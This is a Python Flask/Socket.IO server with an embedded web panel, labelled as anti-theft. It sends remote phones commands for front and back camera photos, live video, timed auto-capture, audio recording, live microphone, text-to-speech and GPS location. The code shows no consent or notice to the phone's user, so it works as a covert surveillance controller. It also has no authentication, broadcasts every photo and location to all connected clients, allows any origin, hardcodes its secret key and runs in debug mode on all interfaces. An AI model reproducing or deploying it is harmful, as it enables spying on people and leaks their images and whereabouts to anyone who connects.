import os
import json
import base64
from flask import Flask, render_template_string, request, jsonify
from flask_socketio import SocketIO, emit, join_room, leave_room
import eventlet

# Initialize Flask App
app = Flask(__name__)
app.config['SECRET_KEY'] = 'antitheft_secret_key_123'
socketio = SocketIO(app, cors_allowed_origins='*', async_mode='eventlet')

# Store connected devices
# Structure: { device_id: { sid: str, info: dict, status: 'online' } }
devices = {}

# Embedded HTML/CSS/JS Template
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Anti-Theft Control Panel</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        :root {
            --bg-color: #1a1a2e;
            --card-bg: #16213e;
            --accent-color: #00ff88;
            --text-color: #e94560;
            --white: #ffffff;
            --danger: #ff4444;
            --warning: #ffaa00;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: var(--bg-color);
            color: var(--white);
            margin: 0;
            padding: 0;
            display: flex;
            height: 100vh;
            overflow: hidden;
        }
        
        /* Sidebar */
        .sidebar {
            width: 300px;
            background-color: var(--card-bg);
            padding: 20px;
            display: flex;
            flex-direction: column;
            border-right: 1px solid #333;
        }
        .logo {
            font-size: 24px;
            font-weight: bold;
            color: var(--accent-color);
            margin-bottom: 20px;
            text-align: center;
        }
        .device-list {
            flex-grow: 1;
            overflow-y: auto;
        }
        .device-item {
            background: rgba(255, 255, 255, 0.05);
            padding: 15px;
            margin-bottom: 10px;
            border-radius: 10px;
            cursor: pointer;
            transition: all 0.3s;
            border: 1px solid transparent;
        }
        .device-item:hover, .device-item.active {
            border-color: var(--accent-color);
            background: rgba(0, 255, 136, 0.1);
        }
        .device-status {
            display: inline-block;
            width: 10px;
            height: 10px;
            border-radius: 50%;
            margin-right: 10px;
        }
        .status-online { background-color: var(--accent-color); }
        .status-offline { background-color: #666; }
        
        /* Main Content */
        .main-content {
            flex-grow: 1;
            padding: 20px;
            overflow-y: auto;
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            align-content: start;
        }
        .card {
            background-color: var(--card-bg);
            border-radius: 15px;
            padding: 20px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
        }
        .card-header {
            font-size: 18px;
            font-weight: bold;
            margin-bottom: 15px;
            color: var(--accent-color);
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        /* Buttons & Inputs */
        button {
            padding: 10px 15px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            background-color: var(--accent-color);
            color: #000;
            font-weight: bold;
            transition: opacity 0.2s;
            margin: 5px;
        }
        button:hover { opacity: 0.8; }
        button.danger { background-color: var(--danger); color: white; }
        button.warning { background-color: var(--warning); color: black; }
        
        input[type="text"], input[type="number"], input[type="file"] {
            padding: 8px;
            border-radius: 5px;
            border: 1px solid #444;
            background: #222;
            color: white;
            width: 100%;
            margin-bottom: 10px;
            box-sizing: border-box;
        }
        
        /* Specific Styles */
        .camera-preview {
            width: 100%;
            height: 200px;
            background: #000;
            border-radius: 10px;
            margin-bottom: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #666;
            overflow: hidden;
        }
        .camera-preview img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        .gallery-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 5px;
            max-height: 300px;
            overflow-y: auto;
        }
        .gallery-img {
            width: 100%;
            aspect-ratio: 1;
            object-fit: cover;
            border-radius: 5px;
            cursor: pointer;
        }

        /* Modal */
        .modal {
            display: none;
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: rgba(0,0,0,0.9);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }
        .modal img {
            max-width: 90%;
            max-height: 90%;
            border-radius: 10px;
        }
        .close-modal {
            position: absolute;
            top: 20px; right: 20px;
            color: white;
            font-size: 30px;
            cursor: pointer;
        }

        #empty-state {
            grid-column: 1 / -1;
            text-align: center;
            padding: 50px;
            color: #666;
        }
        
        .toast {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: var(--accent-color);
            color: black;
            padding: 10px 20px;
            border-radius: 5px;
            display: none;
            z-index: 2000;
        }
    </style>
</head>
<body>

<div class="sidebar">
    <div class="logo"><i class="fas fa-shield-alt"></i> ANTI-THEFT</div>
    <div class="device-list" id="deviceList">
        <!-- Devices will be added here -->
    </div>
</div>

<div class="main-content" id="mainContent">
    <div id="empty-state">
        <h2>Select a device to control</h2>
        <p>No device selected or no devices connected.</p>
    </div>
    
    <!-- Camera Card -->
    <div class="card control-panel" style="display:none">
        <div class="card-header"><i class="fas fa-camera"></i> Camera Control</div>
        <div class="camera-preview" id="camPreview"><span>Preview</span></div>
        <div>
            <button onclick="sendCommand('take_photo', {camera: 'back'})">Back Photo</button>
            <button onclick="sendCommand('take_photo', {camera: 'front'})">Front Photo</button>
            <button class="warning" onclick="toggleLive('start')">Start Live</button>
            <button class="danger" onclick="toggleLive('stop')">Stop Live</button>
        </div>
        <div style="margin-top: 10px; border-top: 1px solid #333; padding-top: 10px;">
            <label>Auto Capture (sec):</label>
            <input type="number" id="autoCapInterval" value="5" min="1">
            <button onclick="startAutoCapture()">Start Auto</button>
            <button class="danger" onclick="stopAutoCapture()">Stop</button>
        </div>
    </div>

    <!-- Audio Card -->
    <div class="card control-panel" style="display:none">
        <div class="card-header"><i class="fas fa-microphone"></i> Audio Control</div>
        <button onclick="sendCommand('record_audio', {duration: 10})">Record 10s Audio</button>
        <button class="warning" onclick="sendCommand('start_live_mic', {})">Start Live Mic</button>
        <button class="danger" onclick="sendCommand('stop_live_mic', {})">Stop Live Mic</button>
        
        <div style="margin-top: 15px;">
            <label>Text to Speech:</label>
            <input type="text" id="ttsInput" placeholder="Enter text to speak...">
            <button onclick="sendTTS()">Speak</button>
        </div>
    </div>

    <!-- Flashlight & Location Card -->
    <div class="card control-panel" style="display:none">
        <div class="card-header"><i class="fas fa-bolt"></i> Tools</div>
        <button onclick="sendCommand('flash_on', {})">Flash ON</button>
        <button class="danger" onclick="sendCommand('flash_off', {})">Flash OFF</button>
        <div style="margin-top: 5px;">
            <input type="range" id="blinkSpeed" min="100" max="1000" value="500">
            <button onclick="sendBlink()">Blink</button>
        </div>
        
        <hr style="border-color: #333">
        <div class="card-header"><i class="fas fa-map-marker-alt"></i> Location</div>
        <div id="locationDisplay" style="margin-bottom: 10px; font-family: monospace;">Waiting for data...</div>
        <button onclick="sendCommand('get_location', {})">Get Location</button>
        <button onclick="openMap()">Open Map</button>
    </div>

    <!-- Gallery Card -->
    <div class="card control-panel" style="display:none">
        <div class="card-header"><i class="fas fa-images"></i> Gallery</div>
        <div class="gallery-grid" id="galleryGrid">
            <!-- Photos appear here -->
        </div>
    </div>
</div>

<div class="toast" id="toast">Command Sent</div>

<!-- Modal for full image -->
<div class="modal" id="imgModal" onclick="this.style.display='none'">
    <span class="close-modal">&times;</span>
    <img id="modalImg" src="">
</div>

<script>
    const socket = io();
    let currentDeviceId = null;
    let lastLocation = {lat: 0, lng: 0};

    // Socket Events
    socket.on('connect', () => {
        console.log('Connected to server');
        showToast('Connected to Control Server');
    });

    socket.on('devices_update', (devices) => {
        updateDeviceList(devices);
    });

    socket.on('device_response', (data) => {
        if (data.device_id !== currentDeviceId) return;
        handleResponse(data);
    });

    // Device Management
    function updateDeviceList(devices) {
        const list = document.getElementById('deviceList');
        list.innerHTML = '';
        
        for (const [id, dev] of Object.entries(devices)) {
            const item = document.createElement('div');
            item.className = `device-item ${currentDeviceId === id ? 'active' : ''}`;
            item.innerHTML = `
                <span class="device-status status-${dev.status}"></span>
                <strong>${dev.info.name}</strong><br>
                <small style="color:#aaa">${dev.info.model}</small>
            `;
            item.onclick = () => selectDevice(id);
            list.appendChild(item);
        }
    }

    function selectDevice(id) {
        currentDeviceId = id;
        document.querySelectorAll('.control-panel').forEach(el => el.style.display = 'block');
        document.getElementById('empty-state').style.display = 'none';
        
        // Refresh list to highlight active
        socket.emit('request_devices_update'); 
    }

    // Command Functions
    function sendCommand(cmd, params) {
        if (!currentDeviceId) return showToast('No device selected!');
        socket.emit('send_command', {
            device_id: currentDeviceId,
            command: cmd,
            params: params
        });
        showToast(`Sent: ${cmd}`);
    }

    function startAutoCapture() {
        const interval = document.getElementById('autoCapInterval').value;
        sendCommand('start_auto_capture', {interval: interval});
    }

    function stopAutoCapture() {
        sendCommand('stop_auto_capture', {});
    }

    function toggleLive(action) {
        if (action === 'start') sendCommand('start_live_camera', {});
        else sendCommand('stop_live_camera', {});
    }

    function sendTTS() {
        const text = document.getElementById('ttsInput').value;
        if (text) sendCommand('tts', {text: text});
    }

    function sendBlink() {
        const speed = document.getElementById('blinkSpeed').value;
        sendCommand('flash_blink', {speed: speed});
    }

    function openMap() {
        if (lastLocation.lat === 0) return showToast('No location data yet');
        window.open(`https://www.google.com/maps?q=${lastLocation.lat},${lastLocation.lng}`, '_blank');
    }

    // Response Handling
    function handleResponse(data) {
        const type = data.type;
        const payload = data.data;

        if (type === 'photo' || type === 'live_frame') {
            const img = document.createElement('img');
            img.src = `data:image/jpeg;base64,${payload.image}`;
            
            if (type === 'live_frame') {
                const preview = document.getElementById('camPreview');
                preview.innerHTML = '';
                preview.appendChild(img);
            } else {
                img.className = 'gallery-img';
                img.onclick = () => showModal(img.src);
                document.getElementById('galleryGrid').prepend(img);
            }
        }
        else if (type === 'location') {
            lastLocation = {lat: payload.lat, lng: payload.lng};
            document.getElementById('locationDisplay').innerHTML = 
                `Lat: ${payload.lat}<br>Lng: ${payload.lng}<br>Acc: ${payload.accuracy}m`;
        }
        else if (type === 'audio') {
            // In a real browser, we might need more complex handling for raw audio
            // For now, let's assume it sends a downloadable link or play request?
            // Or base64 which we can play.
            showToast('Audio received (Save logic not implemented in UI demo)');
        }
    }

    function showModal(src) {
        const modal = document.getElementById('imgModal');
        const img = document.getElementById('modalImg');
        img.src = src;
        modal.style.display = 'flex';
    }

    function showToast(msg) {
        const toast = document.getElementById('toast');
        toast.innerText = msg;
        toast.style.display = 'block';
        setTimeout(() => toast.style.display = 'none', 3000);
    }
</script>
</body>
</html>
"""

# Routes
@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/devices')
def get_devices():
    return jsonify(devices)

# Socket Events
@socketio.on('connect')
def handle_connect():
    print(f"Client connected: {request.sid}")

@socketio.on('disconnect')
def handle_disconnect():
    print(f"Client disconnected: {request.sid}")
    # Find device by sid and mark offline
    for dev_id, dev in devices.items():
        if dev['sid'] == request.sid:
            dev['status'] = 'offline'
            emit('devices_update', devices, broadcast=True)
            break

@socketio.on('register_device')
def handle_register(data):
    # data: {device_id, name, model}
    dev_id = data.get('device_id')
    if not dev_id: return
    
    devices[dev_id] = {
        'sid': request.sid,
        'info': data,
        'status': 'online'
    }
    join_room(dev_id)
    print(f"Device Registered: {data['name']} ({dev_id})")
    emit('devices_update', devices, broadcast=True)

@socketio.on('request_devices_update')
def handle_req_update():
    emit('devices_update', devices)

@socketio.on('send_command')
def handle_command(data):
    # data: {device_id, command, params}
    target_id = data.get('device_id')
    command = data.get('command')
    params = data.get('params', {})
    
    if target_id in devices and devices[target_id]['status'] == 'online':
        print(f"Sending command {command} to {target_id}")
        emit('command', {'command': command, 'params': params}, room=target_id)
    else:
        print(f"Device {target_id} not found or offline")

@socketio.on('device_response')
def handle_response(data):
    # data: {type, device_id, data}
    # Forward response to all web clients (broadcast for now, can be optimized)
    # Ideally should forward to the 'controller' room, but we'll broadcast to keep it simple
    print(f"Received response from {data.get('device_id')}: {data.get('type')}")
    emit('device_response', data, broadcast=True)

if __name__ == '__main__':
    # Ensure eventlet is used for async performance
    socketio.run(app, host='0.0.0.0', port=5000, debug=True)
